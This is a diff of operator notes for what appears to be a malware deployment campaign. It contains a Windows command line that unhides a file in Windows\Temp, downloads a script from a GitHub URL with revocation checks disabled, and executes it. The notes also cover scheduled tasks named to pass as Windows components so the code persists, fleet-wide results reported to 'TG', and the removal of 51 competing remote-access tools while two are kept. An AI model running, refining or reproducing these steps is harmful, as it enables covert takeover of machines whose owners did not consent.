@@ -1,12 +1,19 @@
-UNIVERSAL DEPLOY (O33 — IDENTVER=7 root-level tasks, CRLF):
+UNIVERSAL DEPLOY (O34 / M24 / L13 / T14 / S6):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o33" & findstr /C:"OWN BUILD 20260802O33" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/b57c01b/own.txt" & findstr /C:"OWN BUILD 20260802O34" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-Must print: === OWN BUILD 20260802O33 ===
+Must print: === OWN BUILD 20260802O34 ===
 
-O33 fix: nested \Microsoft\Windows\* schtasks Create = Access Denied fleet-wide
-(verify_taskA-D_FAIL). Detach WucacheOwn worked (root-level). Now identity
-tasks are root names: \WerQueueSync \PlaServerHealth \WdiHostProxy etc.
+O34: schtasks Create uses BOOT TR (Windows\Temp\.wucache) like working WucacheOwn
+detach — ProgramData .wucache is ACL-locked by early secure so TR there failed.
+IDENTVER=8 root names without leading backslash; /ST on MINUTE tasks.
 
-Expect TG: tasks 4/5 or 5/5, identity like \WerQueueSync (NOT \Microsoft\Windows\...)
-Payload: MON=M23 | SEC=S6 | TGR=T13 | LIB=L12
+Expect TG:
+  Source build: O34
+  Payload: MON=M24 | SEC=S6 | TGR=T14 | LIB=L13
+  identity_A=WerQueueSync (no \Microsoft\Windows\...)
+  Persist tasks OK: 4/5 or 5/5
+  boot.err: create_taskA_begin (not only verify_taskA_FAIL)
+
+KEEP: dual ScreenConnect + Datto/CentraStage
+REMOVE: 51 RMM/remote tools
